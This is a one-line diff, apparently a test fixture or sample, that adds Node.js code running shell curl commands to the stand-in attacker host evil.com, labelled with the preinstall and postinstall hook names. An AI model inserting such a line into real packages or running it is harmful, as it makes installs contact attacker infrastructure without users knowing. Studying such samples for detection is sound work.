@@ -1,0 +1,1 @@
+const cp = require("child_process"); ["preinstall", "postinstall"].forEach(function(s) { cp.execSync("curl http://evil.com/" + s); });
